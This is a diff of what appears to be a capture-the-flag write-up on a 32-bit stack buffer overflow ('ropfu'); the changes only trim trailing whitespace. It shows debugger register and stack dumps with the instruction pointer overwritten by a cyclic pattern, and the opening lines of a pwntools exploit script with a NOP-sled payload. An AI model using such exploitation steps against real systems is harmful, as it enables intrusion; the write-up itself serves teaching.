@@ -12,16 +12,16 @@ To gain this specific direction, a precise instrument was required: the cyclic p
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ─────────────────────────────────────────────────────────────── registers ────
 $eax   : 0xfffffe00
-$ebx   : 0x0       
+$ebx   : 0x0
 $ecx   : 0x080e8330  →  0x00000000
-$edx   : 0x400     
+$edx   : 0x400
 $esp   : 0xffffa470  →  0xffffa508  →  0xffffa568  →  0xffffa598  →  0xffffa5b8  →  0x00000000
 $ebp   : 0xffffa508  →  0xffffa568  →  0xffffa598  →  0xffffa5b8  →  0x00000000
-$esi   : 0x0       
+$esi   : 0x0
 $edi   : 0x080e5300  →  <_IO_2_1_stdin_+0000> mov BYTE PTR [edx], ah
 $eip   : 0xf7ffc5b9  →  <__kernel_vsyscall+0009> pop ebp
 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
-$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
 ─────────────────────────────────────────────────────────────────── stack ────
 0xffffa470│+0x0000: 0xffffa508  →  0xffffa568  →  0xffffa598  →  0xffffa5b8  →  0x00000000	← $esp
 0xffffa474│+0x0004: 0x00000400
@@ -41,7 +41,7 @@ $esi   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0000> add BYTE PTR [eax], al
 $edi   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0000> add BYTE PTR [eax], al
 $eip   : 0x61616168 ("haaa"?)
 $eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
-$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
 ─────────────────────────────────────────────────────────────────── stack ────
 0xffffa5a0│+0x0000: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]" ← $esp
 0xffffa5a4│+0x0004: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
@@ -80,7 +80,7 @@ Recall that our EAX register, as observed in the initial crash state (`$eax : 0x
 ![Memory layout](/images/posts/ropfu/screenshot-3.png)
 
 ```python
-import pwn 
+import pwn
 import sys
 
 payload = b'\x90' * 26
